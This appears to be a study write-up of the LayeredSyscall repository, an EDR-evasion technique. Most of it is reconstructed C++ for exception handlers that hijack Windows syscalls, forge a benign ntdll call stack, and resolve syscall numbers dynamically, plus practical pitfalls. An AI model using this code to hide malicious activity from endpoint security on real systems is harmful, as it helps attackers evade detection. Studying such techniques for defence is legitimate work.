# LayeredSyscall — Full Source Analysis

**Repo:** `WKL-Sec/LayeredSyscall` (GitHub)
**Files Read:** HookModule.cpp, FuncWrappers.cpp, FuncWrappers.h, imports.h, demo.cpp

## Core Concept

Use Vectored Exception Handling (VEH) + hardware breakpoints to intercept syscall execution at the ntdll boundary, then forge a legitimate call stack inside ntdll so EDR sees the call coming from a harmless Windows API (MessageBoxA) instead of your code.

## HookModule.cpp Architecture

### Three Exception Handlers

#### 1. AddHwBp — Exception handler for EXCEPTION_ACCESS_VIOLATION
Triggered when `_SetHwBp()` writes to a deliberately invalid address.

```cpp
if (ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
    // The real Nt* function address is in RCX at time of fault
    SyscallEntryAddr = ExceptionInfo->ContextRecord->Rcx;
    
    // Walk bytes to find syscall;ret opcodes
    for (int i = 0; i < 25; i++) {
        if (*(BYTE*)(addr+i) == 0x0F && *(BYTE*)(addr+i+1) == 0x05) {
            OPCODE_SYSCALL_OFF = i;     // offset of 'syscall' within function
            OPCODE_SYSCALL_RET_OFF = i+2; // offset of 'ret'
            break;
        }
    }
    
    // Set HW breakpoints: Dr0=syscall, Dr1=ret
    ExceptionInfo->ContextRecord->Dr0 = SyscallEntryAddr;
    ExceptionInfo->ContextRecord->Dr7 |= (1 << 0);  // enable Dr0
    ExceptionInfo->ContextRecord->Dr1 = SyscallEntryAddr + OPCODE_SYSCALL_RET_OFF;
    ExceptionInfo->ContextRecord->Dr7 |= (1 << 2);  // enable Dr1
    
    // Skip past the faulting instruction
    ExceptionInfo->ContextRecord->Rip += OPCODE_SZ_ACC_VIO;
}
```

#### 2. HandlerHwBp — Exception handler for EXCEPTION_SINGLE_STEP

**Case A: syscall HWBP hit** (Dr0 match)
```cpp
// Save ALL register context (this captures function args from Rcx/Rdx/R8/R9)
memcpy_s(SavedContext, ExceptionInfo->ContextRecord);
// Change RIP to demofunction() — will execute MessageBoxA inside ntdll
ExceptionInfo->ContextRecord->Rip = (ULONG_PTR)demofunction;
// Set TraceFlag — single-step through every instruction
ExceptionInfo->ContextRecord->EFlags |= TRACE_FLAG;
```

**Case B: ret HWBP hit** (Dr1 match — syscall completed)
```cpp
// Restore original stack pointer
ExceptionInfo->ContextRecord->Rsp = SavedContext->Rsp;
// Clear Dr1 breakpoint
ExceptionInfo->ContextRecord->Dr1 = 0;
ExceptionInfo->ContextRecord->Dr7 &= ~(1 << 2);
```

**Case C: TraceFlag stepping inside ntdll range**
```cpp
// Step 1: Find `sub rsp, 0x58+` — a legitimate function frame
if (opcode == OPCODE_SUB_RSP && imm >= 0x58) {
    IsSubRsp = 1;  // found a function that allocates enough stack
}

// Step 2: Wait for a `call` instruction inside that function
if (IsSubRsp == 1 && opcode == OPCODE_CALL) {
    IsSubRsp = 2;  // this is the frame we want — call is about to execute
}

// Step 3: At call target — restore syscall context, set Rax=SSN, execute syscall
if (IsSubRsp == 2) {
    ULONG64 TempRsp = ExceptionInfo->ContextRecord->Rsp;
    memcpy_s(ExceptionInfo->ContextRecord, SavedContext);
    ExceptionInfo->ContextRecord->Rsp = TempRsp;  // use found stack frame
    
    ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx; // mov r10, rcx
    ExceptionInfo->ContextRecord->Rax = SyscallNo;  // set SSN
    ExceptionInfo->ContextRecord->Rip = SyscallEntryAddr + OPCODE_SYSCALL_OFF; // jump to syscall
    
    // Copy stack-based args (>4 args) from saved context
    if (ExtendedArgs) {
        *(Rsp + FIFTH_ARG) = *(SavedContext->Rsp + FIFTH_ARG);
        // ... up to 12th argument
    }
    
    ExceptionInfo->ContextRecord->EFlags &= ~TRACE_FLAG;  // stop tracing
}
```

### FuncWrappers.cpp Pattern

Each wrapper function follows the exact same pattern (32 functions total):

```cpp
ULONG wrpNtClose(HANDLE Handle) {
    // 1. Resolve real function from ntdll
    orgNtClose pNtClose = GetProcAddress("ntdll.dll", "NtClose");
    // 2. Get SSN from exception directory (not hardcoded!)
    int ssn = GetSsnByName("NtClose");
    // 3. Set HWBP + trigger exception to start interception
    SetHwBp((ULONG_PTR)pNtClose, TRUE, ssn);
    // 4. Call the real function — execution will be intercepted by VEH
    return pNtClose(Handle);
}
```

### GetSsnByName() — Dynamic SSN Resolution

**Key insight:** Uses ntdll's Exception Directory (RUNTIME_FUNCTION table), not the Export table. This is more reliable across Windows versions.

```cpp
int GetSsnByName(PCHAR syscall) {
    // Walk PEB->Ldr to find ntdll base address
    auto Ldr = NtCurrentTeb()->ProcessEnvironmentBlock->Ldr;
    
    // For each loaded module:
    while (Next != Head) {
        auto ent = CONTAINING_RECORD(Next, LDR_DATA_TABLE_ENTRY, ...);
        auto m = (PBYTE)ent->DllBase;
        
        // Parse PE headers to find Exception Directory
        auto nt = m + ((PIMAGE_DOS_HEADER)m)->e_lfanew;
        auto exp_rva = nt->OptionalHeader.DataDirectory[EXPORT].VirtualAddress;
        auto exp = (PIMAGE_EXPORT_DIRECTORY)(m + exp_rva);
        
        // Check if this module is ntdll.dll (compare name at export table)
        auto dll = (PDWORD)(m + exp->Name);
        if ((dll[0] | 0x20202020) != 'ldtn') continue;  // "ntdl"
        
        // Load Exception Directory
        auto exc_rva = nt->OptionalHeader.DataDirectory[EXCEPTION].VirtualAddress;
        auto rtf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(m + exc_rva);
        
        // For each RUNTIME_FUNCTION entry:
        for (int i = 0; rtf[i].BeginAddress; i++) {
            // Walk exports to find name matching this address
            for (int j = 0; j < exp->NumberOfFunctions; j++) {
                if (adr[ord[j]] == rtf[i].BeginAddress) {
                    auto api_name = (PCHAR)(m + sym[j]);
                    // Compare name
                    if (!strcmp(api_name, syscall)) return ssn;
                    // If starts with "Zw", increment SSN count
                    if (*(USHORT*)api_name == 'wZ') ssn++;
                }
            }
        }
    }
    return -1;
}
```

## Pitfalls

- Two VEH handlers using `AddVectoredExceptionHandler(CALL_FIRST, ...)` — must be FIRST in chain
- `<2 args`: `ExtendedArgs = FALSE`; `>=4 args`: `ExtendedArgs = TRUE`
- The demofunction() must execute a real Windows API call — EDR checks the call stack
- TraceFlag stepping through ALL instructions in ntdll is slow but necessary
- Current Windows (10 x64) tested, Win11 untested